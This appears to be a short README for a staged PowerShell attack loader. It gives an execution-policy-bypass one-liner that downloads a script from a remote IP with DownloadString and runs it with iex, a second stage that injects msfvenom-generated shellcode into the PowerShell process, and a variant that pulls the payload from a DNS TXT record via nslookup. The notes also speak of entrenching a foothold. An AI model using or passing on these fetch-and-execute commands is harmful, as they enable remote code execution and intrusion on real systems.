
# Download the first stage...
``powershell -exec bypass -nop -i iex((New-Object System.Net.Webclient).DownloadString('http://192.178.1.1/some.txt'))``


obviously you need to host the files "some.txt" and "sc.txt".
Some.txt  invokes a second powershell, which downloads and invokes sc.txt (an unnecessary step.. but its a bit of fun to confirm the first one was executed..)
sc.txt injects shellcode into the current powershell window (the current shellcode in the file is just generated with:  ``msfvenom -e windows/x64/exec CMD=calc.exe``)
sc.txt works with non-admin privileges, and can work with admin privs aswell.
in a not-so-legit scenario, you would entrench your foothold before continuing.. if the injected powershell gets killed youll loose the whole thing.

# Another option
if you have a domain with TXT records. copy the some.txt to a TXT record, and make powershell download and invoke it.

``& powershell (nslookup -q=txt somedomain.com)[-1]``
